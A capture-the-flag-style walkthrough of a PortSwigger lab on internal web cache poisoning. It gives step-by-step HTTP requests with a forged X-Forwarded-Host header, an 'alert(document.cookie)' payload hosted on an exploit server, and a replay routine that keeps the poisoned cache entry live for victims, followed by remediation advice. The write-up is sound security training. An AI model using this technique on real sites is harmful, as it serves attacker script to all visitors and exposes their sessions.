# Lab 13: Internal Cache Poisoning

**Category:** Web Cache Poisoning
**Difficulty:** Expert
**Lab link:** [Internal cache poisoning](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal)

## Overview

The site runs two cache layers. The external cache keys on the query string and `X-Forwarded-Host`. The internal cache keys on **neither** — it ignores the query string and does not key on `X-Forwarded-Host`. This means the internal cache can store a response fragment built from an attacker-controlled host value, and serve it to all users regardless of their query string or the absence of the header.

The `geolocate.js` import is served from the internal cache separately. Once poisoned, it stays poisoned even when the query string changes — proving it is internally cached and unkeyed.

## Key Concepts

- **Dual cache layers:** external cache keys on query string + `X-Forwarded-Host`; internal cache keys on neither.
- **Fragment-level internal caching:** `geolocate.js` is cached as an independent fragment internally. The external cache stores the full page, but the internal cache stores that fragment.
- **Proving internal poisoning:** remove `X-Forwarded-Host` and resend — `geolocate.js` still reflects your server while `canonical` and `analytics.js` do not. This confirms the internal cache is poisoned independently.
- **Cache buster technique:** unique query parameter forces fresh responses from the external cache while the internal cache ignores it — allows confirming when the internal fragment flips.

## Exploit Server Setup

**File:** `/js/geolocate.js`  
**Body:**
```javascript
alert(document.cookie)
```

## Solution

### Step 1 — Add a cache buster and confirm external keying

Add a unique query param (`?cb=<unique>`) to `GET /`. Each change produces a fresh response from the external cache, confirming it keys on the query string.

### Step 2 — Add X-Forwarded-Host and send repeatedly

```http
GET /?cb=<unique> HTTP/1.1
Host: <lab>
X-Forwarded-Host: <exploit-server>
```

The `canonical` link and `analytics.js` URLs immediately reflect your server. Keep sending — the `geolocate.js` URL will eventually also flip to your server when the internal cache picks up the poisoned fragment.

### Step 3 — Confirm internal cache poisoning

Remove `X-Forwarded-Host`, keep the cache buster, resend. If `geolocate.js` still points to your exploit server while the other URLs revert — the internal cache is poisoned.

### Step 4 — Host the malicious file

Create `/js/geolocate.js` on the exploit server with `alert(document.cookie)` as the body.

### Step 5 — Poison without cache buster

Remove the cache buster, re-add `X-Forwarded-Host`. Keep sending until all three dynamic URLs (`canonical`, `analytics.js`, `geolocate.js`) point to your exploit server in a response without a cache buster.

### Step 6 — Keep replaying

Replay the request every ~25 seconds to keep the poisoned entry cached until the victim visits.

## Remediation

- Key the internal cache on the same set of inputs as the external cache (or more).
- Do not cache responses that reflect user-controlled headers unless those headers are part of the cache key.
- Strip `X-Forwarded-Host` at the edge before it reaches inner cache layers.
- Use `Vary` headers to ensure cache layers agree on what constitutes a distinct response.

## Key Takeaways

- Multi-layer caching creates asymmetric key mismatches — the internal cache may be more permissive than the external one.
- A cache buster isolates external cache behaviour from internal cache behaviour, making internal poisoning detectable.
- Persistence after header removal is the definitive proof that the internal cache is poisoned independently.
